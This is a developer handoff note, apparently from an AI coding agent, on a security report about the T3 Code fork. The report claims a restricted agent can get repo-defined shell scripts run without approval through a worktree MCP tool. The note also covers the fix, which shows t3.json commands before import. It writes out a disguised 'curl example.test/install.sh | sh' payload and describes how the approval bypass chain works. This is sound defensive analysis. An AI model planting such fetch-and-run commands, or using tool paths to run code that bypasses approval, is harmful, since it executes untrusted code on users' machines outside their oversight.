# Handoff — worktree-script security report + t3.json import hardening

Date: 2026-11-24 · Branch: `remove-all-telemetry` · Task: verify an external
vulnerability report against this fork, then ship the hardening it motivated.

## 1. The report, and the verdict

Someone ("Jason") reported a T3 Code vulnerability: since upstream Nov 20 a
repo's `t3.json` can set `worktreeLayout` shell commands that run with no
prompt whenever a thread worktree is created, and an agent whose shell
commands need approval can trigger them via `t3_worktree_handoff`, which
checks only that the caller is a live thread, not its permission mode.

**Verdict: accurate about upstream, and the reported mechanism does not exist
in this fork.** One link of the chain did exist here (user approves an import
by name without seeing the command); that is what got fixed.

Claim-by-claim (all verified from source):

- **`worktreeLayout` in t3.json** — upstream-only. Added Nov 20 in
  `60863edc41` (#35925), runs shell commands from t3.json at task-folder
  worktree creation (and again on restore). Not in this fork: no
  `worktreeLayout` key anywhere in our schema
  (`packages/contracts/src/t3ProjectFile.ts`), and `60863edc41` is not an
  ancestor of `main` (last upstream merge `274216c549`, Nov 20).
- **Agent-triggered, approval-free script execution** — TRUE here, and
  intended. `t3_worktree_handoff` uses `McpToolAccess.actsAsCaller`
  (`apps/server/src/mcp/McpToolAccess.ts:158`): live thread caller only, no
  runtime-mode check. Thread credentials carry the `worktree` capability
  unconditionally (`apps/server/src/mcp/McpSessionRegistry.ts:214`).
  `runSetupScript` defaults to true (`apps/server/src/mcp/WorktreeMcpService.ts:350`)
  and `ProjectSetupScriptRunner.runForThread` types the command into a
  terminal with no approval and no mode check — the only gate is fenced link
  origins (`apps/server/src/project/ProjectSetupScriptRunner.ts:434`,
  `skipped-for-link`). `t3_thread_launch` worktrees do the same
  (`apps/server/src/orchestration-v2/ThreadLaunchService.ts:951`).
  **Why this is not a finding under our SECURITY.md** ("MCP access declared
  per tool"): the command is the project owner's script, and a restricted
  agent cannot choose it — setting project scripts requires full access
  (`t3_project_update` → `writesEnvironment` → `assertFullAccess`,
  `apps/server/src/mcp/threadAccess.ts:218`) or a user import. Upstream
  reached the same verdict after #41986: local agent threads still run
  layout/setup commands regardless of mode.
- **Upstream fix #41986** (`29c852eada`, Nov 23) gates layout commands on
  request authority (WS session must hold `orchestration:operate` /
  `terminal:operate`; fenced links get `projectCommands: false`). It does
  **not** check who wrote t3.json or the thread's mode — the report's
  critique of it is correct. Nothing to backport: it gates commands we don't
  have, and its link-fencing half we already had.
- **"Stable 0.1.11 unaffected"** — upstream-only truth. Our analog (scripts +
  handoff tool) has shipped in our stable since Oct/Feb 2026.

## 2. The real gap that got fixed

Importing a script from a repo's t3.json was approved by **name only**:
`ProjectScriptsControl.tsx` rendered the menu item with name + icon, never
the command, and imported on click. A repo could launder
`curl example.test/install.sh | sh` behind "Install dependencies"; after one
misclick it auto-ran on every new worktree thread (`runOnWorktreeCreate`) or
every settle (`runOnSettle`). The command only became visible after import,
in Project Actions settings. Settings-side "Import scripts" popover already
showed commands; mobile has no import UI.

## 3. The fix (4 files, currently inside `f90618b2b3` — see §5)

- `apps/web/src/components/projectScriptEditor.tsx` — new shared
  `ProjectScriptFlags` rendering the `setup` / `on settle` badges (copy and
  styling identical to what `ProjectActionsList` already had; no new i18n keys).
- `apps/web/src/components/ProjectScriptsControl.tsx` — t3.json import menu
  items now show the command (mono, truncated, via `MenuItemDetail`) plus
  `ProjectScriptFlags` badges before the user commits to importing.
- `apps/web/src/components/settings/ProjectActionsList.tsx` — refactored to
  the shared badges; markup unchanged.
- `apps/web/src/components/ProjectScriptsControl.browser.test.tsx` — new
  `it`: command and badges visible pre-import; plain scripts get no badge.

## 4. Verification

- `vp test run` on the three affected test files: 7/7 pass.
- `apps/web` typecheck passes; `vp run i18n:check` passes (reused keys).
- Real-app pass in the dev client with a scratch repo (`/tmp/evil-demo`) whose
  t3.json hides a `curl … | sh` command behind "Install dependencies":
  before/after screenshots at `/tmp/t3-menu-before.png` / `/tmp/t3-menu-after.png`
  (before: name only; after: `setup` badge + `curl example…` command). Import
  exercised end-to-end; settings list and settings import popover checked.
- `check:changed` FAILs are all from the fork's separate E2EE work
  (`socketE2ee.ts`/`ws.ts` lint+format, knip,
  `packages/client-runtime/src/connection/resolver.test.ts` assertion, three
  OOM-killed package typechecks, exit 137) — none touch these files.

## 5. WARNING — the changes are inside the E2EE commit

The developer's commit `f90618b2b3` ("feat: end-to-end encrypted remote
control…") was made while this task was in progress and swept in the four
files above (`git show f90618b2b3 --stat | grep -i projectscript`). The
branch is local-only (no upstream). **Before pushing or opening any PR, split
the four files into their own `fix(web): …` commit beneath the E2EE commit**
(rebase, or `git checkout f90618b2b3^ -- <files>` + amend dance). Also add the
change to `MIA_CHANGELOG.md` (fork convention: every change in order) once the
split lands.

## 6. Deliberately not done

- **Mode-gating setup-script execution on agent-initiated worktree
  requests.** Product decision, not a vuln fix: it would break legitimate
  handoff/launch flows to guard re-running already-approved owner code, and
  upstream explicitly did not do it in #41986. Revisit only if the fork ever
  reads t3.json scripts at worktree-creation time (like upstream's
  `worktreeLayout`); that would make the agent-chosen-command chain possible
  and change the answer.

## 7. Environment state left behind

- Dev server still running for UI inspection: `vp run dev` on ports
  server 13773 / web 5733, PID tree rooted at the value in
  `/tmp/t3-dev.pid`, state `~/.t3/dev` (the dev sandbox — never
  `~/.t3/userdata`). Kill by that PID tree, not by port pattern.
- `~/.t3/dev` contains a scratch project **evil-demo** rooted at
  `/tmp/evil-demo` (crafted t3.json) plus one imported "Install dependencies"
  action. Delete both when done looking.
- Machine had Node 22; repo pins 26.13.1. Node 26 tarball unpacked at
  `/tmp/node26` — prepend to PATH for any `vp`/test command. Playwright
  chromium headless-shell installed into `~/.cache/ms-playwright` (browser
  tests could not run before).
- Throwaway UI driver at `/tmp/t3-verify.js` (repo's own playwright,
  persistent profile `/tmp/t3-profile` holds a paired session for the dev
  server).
